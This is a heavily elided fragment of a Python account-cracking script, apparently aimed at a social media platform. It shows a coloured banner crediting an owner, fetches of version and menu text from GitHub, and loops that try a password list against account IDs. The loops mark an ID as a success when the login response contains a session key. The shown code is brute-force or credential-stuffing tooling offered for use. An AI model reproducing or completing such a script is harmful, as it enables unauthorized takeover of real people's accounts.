...
#━━━━[ UA SERVER]━━━━#
version = httpx.get("https://raw.githubusercontent.com/Legend-770/Legend-XD/main/version.txt").text.strip()
M1 = httpx.get("https://raw.githubusercontent.com/Legend-880/Tool-menu/main/M1.txt").text.strip()
M2 = httpx.get("https://raw.githubusercontent.com/Legend-880/Tool-menu/main/M2.txt").text.strip()
#━━━━[ BANNER/LOGO ]━━━━#
def logo():
...
{rad}--------------------------------------
{rad}[{white}★{rad}] {green}OWNER      {white}>>{green} MST MIM
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'session_key' in q:
                ...
                print(f"\r\r{green}MIM-OK {white}>> {green}{ids}{white}▶︎{green} {pas}")
                oks.append(ids)
...
def __MTDTWO__(ids,names,passlist,total_ids):
    global oks,cps,loop
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r\r{green}MIM-M2{white} >> {abir}{loop}{white} >> {green}OK-{len(oks)}"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
